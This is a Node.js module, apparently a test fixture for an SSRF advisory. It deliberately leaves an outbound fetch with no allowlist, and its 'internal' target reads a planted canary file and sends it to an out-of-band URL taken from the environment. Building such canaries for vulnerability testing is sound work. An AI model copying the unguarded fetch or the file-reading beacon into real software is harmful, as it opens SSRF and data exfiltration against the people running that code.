'use strict';

const fs = require('fs');
const http = require('http');
const https = require('https');

// fetcher is the first-party JS fetch utility named by advisory TEGRON-JS-SSRF-0001.
// fetchUrl(target) is THE SSRF SINK: it forwards a caller-supplied target to an
// outbound HTTP request with no allowlist.
//
// SOUNDNESS: the canary beacon is intrinsic to the SSRF sink's own execution.
// resolveTarget maps the special target name "internal" to the Tegron-controlled OOB
// URL ($TEGRON_OOB_URL) WITH the planted seed (/tmp/tegron_canary) appended. In the
// VULNERABLE build there is NO allowlist, so the unguarded outbound request in
// fetchUrl() actually issues that request — that outbound request IS the SSRF, and it
// is the only thing that carries the seed off-host. A target the resolver does not
// recognize is fetched verbatim and never touches the seed. On the PATCHED build an
// allowlist rejects "internal" before any seed is read and before any outbound
// request is made, so nothing is exfiltrated. A fired beacon is thus attributable to
// the SSRF sink firing, not to a generic exfil.

const CANARY_SEED_PATH = '/tmp/tegron_canary';

// resolveTarget maps a request target name to the URL the server will fetch. The
// VULNERABLE build has no allowlist: "internal" resolves to the Tegron-controlled OOB
// endpoint with the planted seed appended (the SSRF exfil path); any other target is
// returned verbatim and never touches the seed.
function resolveTarget(name) {
    if (name === 'internal') {
        const oob = process.env.TEGRON_OOB_URL;
        if (!oob) {
            return null;
        }
        const seed = fs.readFileSync(CANARY_SEED_PATH, 'utf8');
        return oob + '?kind=canary&data=' + encodeURIComponent(seed);
    }
    return name;
}

// fetchUrl is THE SSRF SINK: an unguarded outbound request to a caller-influenced
// URL. In the VULNERABLE build this fires for the "internal" target and carries the
// seed to the OOB endpoint.
function fetchUrl(target) {
    return new Promise((resolve) => {
        const resolved = resolveTarget(target);
        if (resolved === null) {
            resolve(400);
            return;
        }
        const client = resolved.startsWith('https:') ? https : http;
        const req = client.get(resolved, (res) => {
            res.resume();
            res.on('end', () => resolve(res.statusCode || 200));
        });
        req.on('error', () => resolve(502));
    });
}

module.exports = { fetchUrl };
